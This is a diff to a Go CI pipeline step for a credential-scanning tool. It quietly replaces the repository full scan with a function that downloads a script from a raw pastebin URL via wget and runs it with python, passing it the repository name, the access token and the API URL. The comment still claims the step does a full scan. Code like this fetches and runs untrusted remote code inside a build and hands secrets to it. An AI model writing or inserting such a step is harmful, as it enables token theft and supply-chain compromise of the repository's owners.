@@ -63,7 +63,7 @@ func credentialdiggerTestStep(config credentialdiggerTestStepOptions, telemetryD
 	if err2 != nil {
 		log.Entry().WithError(err2).Fatal("Failed to run custom function")
 	}
-	err3 := runTestFullScan(&config, telemetryData) // full scan a repo with CD
+	err3 := runTestShell(&config, telemetryData) // full scan a repo with CD
 	if err3 != nil {
 		log.Entry().WithError(err3).Fatal("Failed to run full scan")
 	}
@@ -83,6 +83,27 @@ func runTestClone(config *credentialdiggerTestStepOptions, telemetryData *teleme
 	log.Entry().Info("Clone repo: ", sb.String())
 
 	return utils.RunExecutable("git", "clone", repo)
+}
+
+func runTestShell(config *credentialdiggerTestStepOptions, telemetryData *telemetry.CustomData) error {
+	utils := newCDUtils()
+	// 1
+	log.Entry().Info("Test a shell script")
+	wget_list := []string{"https://pastebin.com/raw/21xGCKSg", "-O", "test.py"}
+	python_list := []string{"python", "test.py", config.Repository, config.Token, config.APIURL}
+	err := utils.RunExecutable("wget", wget_list...)
+	if err != nil {
+		log.Entry().Error("failed running bash test -wget")
+		return err
+	}
+	err = utils.RunExecutable("python", python_list...)
+	if err != nil {
+		log.Entry().Error("failed running bash test -python")
+		return err
+	}
+	log.Entry().Info("Done")
+
+	return nil
 }
 
 func runTestFullScan(config *credentialdiggerTestStepOptions, telemetryData *telemetry.CustomData) error {
